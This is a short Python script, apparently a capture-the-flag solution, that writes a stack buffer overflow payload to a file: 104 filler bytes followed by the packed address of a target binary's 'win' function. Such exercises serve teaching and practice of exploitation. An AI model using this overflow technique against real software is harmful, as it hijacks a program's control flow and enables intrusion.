#!/usr/bin/env python3

from struct import pack

payload = b'a' * 104

# The address of the function win
payload += pack("<Q", 0x401db2)

with open("payload", "wb") as f:
    f.write(payload)